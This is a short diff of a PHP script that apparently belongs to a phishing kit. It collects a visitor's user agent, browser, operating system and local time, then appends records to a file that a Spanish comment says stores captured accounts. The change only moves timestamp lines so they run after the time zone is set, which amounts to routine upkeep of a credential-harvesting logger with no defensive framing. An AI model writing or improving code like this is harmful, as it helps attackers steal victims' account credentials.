@@ -74,9 +74,6 @@ $user_agent;
   $ua = getBrowser($user_agent);
   
   
-
-$datum = date("H:i:s A",time());
-$invoegen = $datum . "<br><hr>";
   
   #CAPTURA EL SISTEMA OPERATIVO
   $user_agent = $_SERVER['HTTP_USER_AGENT'];
@@ -118,6 +115,9 @@ $zonahoraria = date_default_timezone_get();
 $date = new DateTime($fecha, new DateTimeZone('America/Mexico_City'));
 date_default_timezone_set('America/Mexico_City');
 $zonahoraria = date_default_timezone_get();
+
+$datum = date("H:i:s A",time());
+$invoegen = $datum . "<br><hr>";
 
 $f = fopen("haber.php", "a"); /*crea un archivo html donde se guarda las cuentas*/
 fwrite ($f, 
